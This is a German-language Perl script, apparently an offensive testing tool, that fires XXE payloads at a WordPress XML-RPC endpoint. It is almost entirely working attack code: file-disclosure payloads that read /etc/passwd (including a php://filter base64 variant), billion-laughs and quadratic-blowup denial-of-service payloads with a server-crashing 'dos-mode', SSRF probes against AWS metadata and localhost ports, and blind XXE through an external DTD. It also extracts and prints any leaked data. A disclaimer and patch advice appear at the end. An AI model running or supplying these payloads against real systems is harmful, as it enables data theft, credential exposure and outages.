#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use MIME::Base64;
use Getopt::Long;
use Time::HiRes qw(time);

# =====================================================================================================================
# WordPress XML-RPC XXE Tester (File Disclosure + Billion Laughs + SSRF)
# Testet verschiedene XXE-Angriffsvektoren gegen WordPress XML-RPC
# =====================================================================================================================
# Hintergrund: Ältere WordPress-Versionen (vor 3.9.2) verwenden die
# Incutio XML-RPC Library, die externe Entities nicht sicher behandelt [citation:8]
# Wenn libxml2 ENTITY_LOADING erlaubt, können lokale Dateien ausgelesen werden [citation:3]
# =====================================================================================================================
# Autor:         Klaus Baumdick (stoerti) aka "The jobless hacker"
# Redesigned:    2026-02-21
# Lizenz:        CC BY-NC-ND 4.0
# Version:       1.0
# =====================================================================================================================
# Dieses Script darf NUR für Bildungszwecke verwendet werden!
#
# Creative Commons Attribution-NonCommercial-NoDerivatives 4.0
# International License (CC BY-NC-ND 4.0)
#
# Du darfst:
# - Das Werk teilen, kopieren und weitergeben
#
# Unter folgenden Bedingungen:
# - Namensnennung: Du musst den Autor (Klaus Baumdick/stoerti) nennen
# - Nicht kommerziell: Keine kommerzielle Nutzung erlaubt
# - Keine Bearbeitung: Keine Veränderungen erlaubt
#
# Vollständige Lizenz: https://creativecommons.org/licenses/by-nc-nd/4.0/
# =====================================================================================================================
# Normale File-Disclosure Tests
# perl 01_XXETest.pl --url https://example.com/xmlrpc.php

# Mit Billion Laughs
# perl 01_XXETest.pl --url https://example.com/xmlrpc.php --billion-laughs

# Kompletter Test
# perl 01_XXETest.pl --url https://example.com/xmlrpc.php --billion-laughs --test-ssrf --verbose

# GEFÄHRLICH! Nur in isolierter Umgebung!
# perl 01_XXETest.pl --url https://test.local/xmlrpc.php --dos-mode --billion-depth 15

# Konfiguration
my $target_url = '';
my $test_file = '/etc/passwd';     # Datei zum Auslesen (Unix-Standard)
my $test_url = 'http://169.254.169.254/latest/meta-data/'; # AWS-Metadaten (für SSRF)
my $timeout = 15;
my $verbose = 0;
my $external_dtd = '';
my $test_billion_laughs = 0;        # Billion Laughs Test aktivieren
my $test_ssrf = 0;                  # SSRF Test aktivieren
my $billion_depth = 10;              # Tiefe für Billion Laughs (Vorsicht!)
my $dos_mode = 0;                    # Extrem-Modus für DoS-Tests

# Kommandozeilenoptionen
GetOptions(
    'url=s'                 => \$target_url,
    'file=s'                => \$test_file,
    'url2=s'                => \$test_url,
    'dtd=s'                 => \$external_dtd,
    'timeout=i'             => \$timeout,
    'verbose'               => \$verbose,
    'billion-laughs'        => \$test_billion_laughs,
    'test-ssrf'             => \$test_ssrf,
    'billion-depth=i'       => \$billion_depth,
    'dos-mode'              => \$dos_mode,
    'help'                  => sub { print_help() }
) or die "Fehler in Kommandozeilenoptionen\n";

if (!$target_url) {
    die "❌ Bitte Ziel-URL angeben (--url https://example.com/xmlrpc.php)\n";
}

if ($dos_mode) {
    $billion_depth = 15;
    $timeout = 5;
    print "⚠️  DOS-MODE AKTIVIERT - Kann Server zum Absturz bringen!\n";
    sleep(2);
}

print "[*] WordPress XML-RPC XXE Test Suite\n";
print "[*] Ziel: $target_url\n";
print "[*] Test-Datei: $test_file\n";
print "[*] Test-URL (SSRF): $test_url\n" if $test_ssrf;
print "-" x 60 . "\n";

# ======================================================================
# 1. PRÜFEN OB XML-RPC AKTIV IST (MIT POST)
# ======================================================================
my $ua = LWP::UserAgent->new(
    timeout => $timeout,
    agent => "Mozilla/5.0 (WordPress XXE Tester)",
    keep_alive => 0,
    max_size => 1024*1024*10,  # 10MB Max für Billion Laughs
);

# Minimalen POST-Request senden um Erreichbarkeit zu prüfen
print "[*] Prüfe XML-RPC Erreichbarkeit...\n";

my $ping_xml = '<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>';

my $test_response = $ua->post($target_url,
    'Content-Type' => 'text/xml',
    'Content' => $ping_xml
);

if ($test_response->code == 200) {
    print "[+] XML-RPC erreichbar und antwortet\n";
}
elsif ($test_response->code == 405) {
    print "⚠️  HTTP 405 - Unerwartet: XML-RPC erwartet POST, wurde aber gesendet\n";
    print "[*] Fahre trotzdem mit Tests fort...\n";
}
elsif ($test_response->code == 403) {
    print "[*] HTTP 403 - XML-RPC erreichbar aber geschützt\n";
    print "[*] Fahre mit Tests fort...\n";
}
elsif ($test_response->code == 404) {
    die "❌ XML-RPC-Endpunkt nicht gefunden (HTTP 404)\n";
}
else {
    print "[*] HTTP " . $test_response->code . " - Fahre mit Tests fort...\n";
}

# ======================================================================
# 2. METHODEN LISTEN (optional, für Kontext)
# ======================================================================
if ($verbose) {
    print "[*] Frage verfügbare Methoden ab...\n";
    my $list_xml = '<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>';

    my $resp = $ua->post($target_url, 'Content-Type' => 'text/xml', 'Content' => $list_xml);
    if ($resp->is_success && $resp->content =~ /<string>(.*?)<\/string>/g) {
        print "[+] XML-RPC Methoden verfügbar\n";
    }
}

# ======================================================================
# 3. XXE PAYLOAD VARIANTEN
# ======================================================================
print "[*] Baue XXE-Payloads...\n";

my @payloads = ();

# --- DATEI AUSLESEN (File Disclosure) ---
push @payloads, {
    name => "File Disclosure - Direkte SYSTEM-Entity",
    type => "file_read",
    xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "' . $test_file . '">
]>
<methodCall>
    <methodName>&xxe;</methodName>
    <params>
        <param>
            <value>
                <string>test</string>
            </value>
        </param>
    </params>
</methodCall>'
};

push @payloads, {
    name => "File Disclosure - Versteckt im String-Wert",
    type => "file_read",
    xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "' . $test_file . '">
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&xxe;</string>
            </value>
        </param>
    </params>
</methodCall>'
};

push @payloads, {
    name => "File Disclosure - PHP Base64 Wrapper",
    type => "file_read",
    xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=' . $test_file . '">
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&xxe;</string>
            </value>
        </param>
    </params>
</methodCall>'
};

# --- BILLION LAUGHS (DoS) ---
if ($test_billion_laughs || $dos_mode) {
    print "\n[*] Generiere Billion Laughs Payloads (Tiefe: $billion_depth)...\n";

    # Billion Laughs Classic
    my $bl_xml = '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">';

    for my $i (1 .. $billion_depth) {
        my $prev = $i == 1 ? "lol" : "lol$i";
        my $current = "lol" . ($i+1);
        $bl_xml .= "\n  <!ENTITY $current \"&$prev;&$prev;&$prev;&$prev;&$prev;&$prev;&$prev;&$prev;&$prev;&$prev;\">";
    }

    $bl_xml .= '
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&lol' . ($billion_depth+1) . ';</string>
            </value>
        </param>
    </params>
</methodCall>';

    push @payloads, {
        name => "Billion Laughs Classic (Tiefe $billion_depth)",
        type => "dos",
        xml => $bl_xml
    };

    # Quadratic Blowup (Alternative DoS-Methode)
    my $quad_xml = '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">';

    my $quad_entity = "a";
    for my $i (1 .. $billion_depth) {
        $quad_entity .= $quad_entity;
        $quad_xml .= "\n  <!ENTITY b$i \"&$quad_entity;&$quad_entity;\">";
    }

    $quad_xml .= '
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&b' . $billion_depth . ';</string>
            </value>
        </param>
    </params>
</methodCall>';

    push @payloads, {
        name => "Quadratic Blowup (Tiefe $billion_depth)",
        type => "dos",
        xml => $quad_xml
    };

    # Recursive Entity Expansion
    my $rec_xml = '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % x "<!ENTITY y SYSTEM \'file:///dev/zero\'>">
  %x;
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&y;</string>
            </value>
        </param>
    </params>
</methodCall>';

    push @payloads, {
        name => "Recursive Entity (/dev/zero)",
        type => "dos",
        xml => $rec_xml
    };
}

# --- SSRF TESTS ---
if ($test_ssrf) {
    push @payloads, {
        name => "SSRF - Externer HTTP Request",
        type => "ssrf",
        xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "' . $test_url . '">
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&xxe;</string>
            </value>
        </param>
    </params>
</methodCall>'
    };

    push @payloads, {
        name => "SSRF - Port Scan (localhost:80)",
        type => "ssrf",
        xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&xxe;</string>
            </value>
        </param>
    </params>
</methodCall>'
    };

    push @payloads, {
        name => "SSRF - Port Scan (localhost:3306)",
        type => "ssrf",
        xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>&xxe;</string>
            </value>
        </param>
    </params>
</methodCall>'
    };
}

# --- EXTERNE DTD (Parameter Entity) ---
if ($external_dtd) {
    push @payloads, {
        name => "Externe DTD - Parameter Entity",
        type => "blind_xxe",
        xml => '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "' . $external_dtd . '">
    %xxe;
]>
<methodCall>
    <methodName>test</methodName>
    <params>
        <param>
            <value>
                <string>test</string>
            </value>
        </param>
    </params>
</methodCall>'
    };
}

# ======================================================================
# 4. TEST ALLER PAYLOADS
# ======================================================================
my $found_xxe = 0;
my $found_dos = 0;
my $found_ssrf = 0;

foreach my $p (@payloads) {
    print "\n[*] Teste: $p->{name}\n";

    my $payload_size = length($p->{xml});
    print "    Payload-Größe: " . int($payload_size/1024) . " KB\n";

    if ($p->{type} eq "dos" && $payload_size > 100000) {
        print "    ⚠️  GROSSER PAYLOAD - Kann Server verlangsamen\n";
    }

    if ($verbose) {
        print "    Payload-Auszug:\n";
        my $preview = substr($p->{xml}, 0, 300);
        $preview =~ s/\n/\\n/g;
        $preview =~ s/\r/\\r/g;
        print "    $preview ...\n\n";
    }

    # Request mit Zeitmessung
    my $start = time();
    my $resp;
    eval {
        local $SIG{ALRM} = sub { die "timeout\n" };
        alarm($timeout + 5);  # Extra Zeit für große Payloads
        $resp = $ua->post($target_url,
            'Content-Type' => 'text/xml',
            'Content' => $p->{xml}
        );
        alarm(0);
    };
    my $duration = time() - $start;

    if ($@) {
        print "    ⚠️  REQUEST TIMEOUT - Server möglicherweise abgestürzt oder überlastet\n";
        if ($p->{type} eq "dos") {
            print "    ✅ MÖGLICHER DOS-ERFOLG! Server reagiert nicht mehr\n";
            $found_dos++;
        }
        next;
    }

    print "    Antwortzeit: " . sprintf("%.2f", $duration) . "s\n";
    print "    HTTP-Status: " . $resp->code . "\n";

    # Antwort analysieren
    my $content = $resp->content;
    my $content_size = length($content);
    print "    Antwortgröße: " . int($content_size/1024) . " KB\n";

    # --- FILE DISCLOSURE ERKENNEN ---
    if ($p->{type} eq "file_read") {
        if ($resp->is_success) {
            if ($content =~ /(root:.*:0:0:|<!\[CDATA\[.*?\]\]>)/is) {
                print "    ✅ FILE DISCLOSURE ERFOLGREICH!\n";
                $found_xxe++;

                my @matches = ($content =~ /(root:.*?:.*?:.*?:.*?:.*?:.*?:.*?\n|<!\[CDATA\[(.*?)\]\]>)/isg);
                if (@matches) {
                    print "\n    [GEFUNDENE DATEN]\n";
                    foreach my $m (@matches) {
                        $m =~ s/<!\[CDATA\[(.*?)\]\]>/$1/;
                        if (length($m) > 200) {
                            print "    " . substr($m, 0, 200) . "...\n";
                        } else {
                            print "    $m\n";
                        }
                    }
                }
            }
            elsif ($content =~ /base64/i && $content =~ /[A-Za-z0-9+\/]{40,}=?/) {
                print "    ⚠️  Base64-kodierte Daten gefunden! Dekodieren:\n";
                my ($b64) = ($content =~ /([A-Za-z0-9+\/]{40,}=?)/);
                if ($b64) {
                    eval {
                        my $decoded = decode_base64($b64);
                        print "    " . substr($decoded, 0, 200) . "\n";
                    };
                }
                $found_xxe++;
            }
        }
    }

    # --- DOS ERKENNEN ---
    if ($p->{type} eq "dos") {
        if ($resp->code == 500 || $resp->code == 503 || $resp->code == 504) {
            print "    ✅ SERVER-FEHLER - Möglicher DoS-Erfolg!\n";
            $found_dos++;
        }
        elsif ($duration > $timeout * 0.8) {
            print "    ⚠️  Ungewöhnlich lange Antwortzeit - Server unter Last?\n";
        }
        if ($content =~ /(memory exhausted|out of memory|fatal error)/i) {
            print "    ✅ SPEICHERFEHLER - Server wahrscheinlich anfällig!\n";
            $found_dos++;
        }
    }

    # --- SSRF ERKENNEN ---
    if ($p->{type} eq "ssrf") {
        if ($resp->is_success && $content =~ /(Connection refused|timed out)/i) {
            print "    ℹ️  Verbindung verweigert - Port geschlossen\n";
        }
        elsif ($resp->is_success && $content =~ /(HTTP.*?200|<!DOCTYPE|<html)/i) {
            print "    ✅ SSRF ERFOLGREICH! Externe Ressource geladen:\n";
            print "    " . substr($content, 0, 200) . "\n";
            $found_ssrf++;
        }
    }

    # --- ALLGEMEINE XXE-ANZEICHEN ---
    if ($content =~ /(Warning.*?simplexml|entity|DOCTYPE|external|parser error)/i) {
        print "    ⚠️  Verdächtige Fehlermeldung:\n";
        my @errors = ($content =~ /(Warning:.*?simplexml.*?\n|Fatal error.*?\n|entity.*?\n)/is);
        foreach my $err (@errors) {
            $err =~ s/\n$//;
            print "      $err\n";
        }
    }

    # Kleine Pause zwischen Tests (außer bei DoS-Tests im DOS-Mode)
    sleep(1) unless $dos_mode;
}

# ======================================================================
# 5. ZUSAMMENFASSUNG
# ======================================================================
print "\n" . "=" x 60 . "\n";
print "ERGEBNISSE:\n";
print "=" x 60 . "\n";

if ($found_xxe) {
    print "❗ KRITISCH: XXE-Schwachstelle (File Disclosure) gefunden!\n";
    print "   Der Server erlaubt das Auslesen lokaler Dateien.\n";
    print "   Dies kann zu vollständiger Kompromittierung führen.\n";
} else {
    print "[+] Keine eindeutigen Anzeichen für File Disclosure gefunden.\n";
}

if ($found_dos) {
    print "❗ KRITISCH: Server ist anfällig für Billion Laughs/DoS!\n";
    print "   Durch XML-Entity-Expansion kann der Server lahmgelegt werden.\n";
}

if ($found_ssrf) {
    print "❗ KRITISCH: SSRF über XXE möglich!\n";
    print "   Der Server kann interne Requests absetzen.\n";
}

if (!$found_xxe && !$found_dos && !$found_ssrf) {
    print "[+] Keine Schwachstellen gefunden.\n";
    print "    Der Server scheint gegen XXE-Angriffe geschützt.\n";
}

# ======================================================================
# 6. EMPFEHLUNGEN
# ======================================================================
print "\n" . "=" x 60 . "\n";
print "EMPFEHLUNGEN:\n";
print "=" x 60 . "\n";

if ($found_xxe || $found_dos || $found_ssrf) {
    print "  • WordPress SOFORT aktualisieren (ab Version 3.9.2 gepatcht)\n";
    print "  • XML-RPC komplett deaktivieren:\n";
    print "    In .htaccess oder Nginx Config:\n";
    print "    <Files xmlrpc.php>\n";
    print "        Require all denied\n";
    print "    </Files>\n";
    print "  • PHP-Konfiguration prüfen:\n";
    print "    libxml_disable_entity_loader(true);\n";
    print "  • In php.ini:\n";
    print "    libxml.external_entities = off\n";
} else {
    print "  • Regelmäßige Updates durchführen\n";
    print "  • XML-RPC weiterhin überwachen\n";
}

# ======================================================================
# HILFSFUNKTION
# ======================================================================
sub print_help {
    print <<"HELP";
Verwendung: $0 --url <xmlrpc.php-URL> [Optionen]

BASIS-OPTIONEN:
  --url URL        Ziel-URL (z.B. https://example.com/xmlrpc.php)
  --file DATEI     Datei zum Auslesen (Default: /etc/passwd)
  --timeout N      Timeout in Sekunden (Default: 15)
  --verbose        Ausführliche Ausgabe
  --help           Diese Hilfe anzeigen

XXE-ANGRIFFSVEKTOREN:
  --billion-laughs Billion Laughs (DoS) Test aktivieren
  --billion-depth N Tiefe für Billion Laughs (Default: 10, Vorsicht!)
  --test-ssrf      SSRF-Tests aktivieren
  --url2 URL       URL für SSRF-Tests (Default: AWS-Metadaten)
  --dtd URL        Eigene externe DTD für Parameter-Entity-Test

GEFÄHRLICHE OPTIONEN:
  --dos-mode       Extrem-Modus - Kann Server zum Absturz bringen!

BEISPIELE:
  # File Disclosure Test
  $0 --url https://wordpress-site.de/xmlrpc.php --verbose

  # File Disclosure + Billion Laughs
  $0 --url https://test-site.de/xmlrpc.php --billion-laughs

  # Kompletter Test
  $0 --url https://example.com/xmlrpc.php --billion-laughs --test-ssrf

  # Gefährlicher Test (nur in isolierter Umgebung!)
  $0 --url https://test.local/xmlrpc.php --dos-mode --billion-depth 15

Hinweis: Nur in autorisierten Umgebungen testen!
HELP
    exit 0;
}
